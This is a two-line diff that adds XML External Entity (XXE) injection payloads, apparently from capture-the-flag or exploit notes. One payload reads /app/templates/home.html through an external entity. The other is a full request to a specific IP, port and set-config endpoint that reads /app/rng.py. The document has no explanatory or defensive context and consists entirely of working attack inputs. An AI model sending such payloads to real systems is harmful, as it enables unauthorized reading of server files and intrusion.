@@ -1,0 +1,2 @@
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///app/templates/home.html" >]><config><location>&xxe;</location></config>
+35.196.135.216:5001/a597bd6e84/set-config?data=<!DOCTYPE f [<!ENTITY x SYSTEM "file:///app/rng.py" >]><location>&x;</location>
